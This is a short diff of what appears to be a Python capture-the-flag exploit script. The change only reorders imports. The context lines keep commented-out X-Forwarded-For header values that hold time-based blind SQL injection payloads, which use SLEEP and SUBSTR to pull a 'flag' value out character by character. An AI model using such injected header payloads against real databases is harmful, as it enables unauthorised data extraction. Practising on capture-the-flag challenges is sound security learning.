@@ -1,8 +1,9 @@
 #!/usr/bin/python3
-from sys import argv
 import string
-import requests
+from sys import argv
 from time import time
+
+import requests
 
 # header = {"X-Forwarded-For" : "1' AND (SELECT 1 FROM (SELECT(SLEEP(10-(IF(SUBSTR((SELECT flag from flag),1,1)='T',0,10)))))bAKL)-- CYEd"}
 # #header = {"X-Forwarded-For" : "1' AND (SELECT 1 FROM (SELECT(SLEEP(5-(IF(1=1)))XyZk)-- CYEd"}
